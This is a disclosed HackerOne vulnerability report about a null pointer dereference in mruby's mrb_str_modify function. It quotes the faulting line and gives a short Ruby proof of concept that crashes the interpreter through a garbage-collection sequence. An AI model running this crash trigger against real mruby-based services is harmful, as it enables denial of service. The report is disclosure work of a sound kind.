# Null pointer dereference in mrb_str_modify

## Report Details
- **Report ID**: 197723
- **URL**: https://hackerone.com/reports/197723
- **State**: Closed
- **Severity**: low
- **Submitted**: 2017-01-12T05:30:25.949Z
- **Disclosed**: 2017-02-07T06:28:59.625Z

## Reporter
- **Username**: marotagem_vrt
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify-scripts

## Vulnerability Information
The function  mrb_str_modify doesn't check if s->as.heap.ptr is NULL before operating in it.

Attempt to write to a NULL pointer happens here:
```
676	      RSTR_PTR(s)[s->as.heap.len] = '\0';
```

Poc:
```ruby
a = String.new
a[0]
GC.start()
a.upcase!
```

Version tested: https://github.com/mruby/mruby/blob/e1ff71029f95e3274136263adbdc51c662ec52de/src/string.c

## Attachments
No attachments
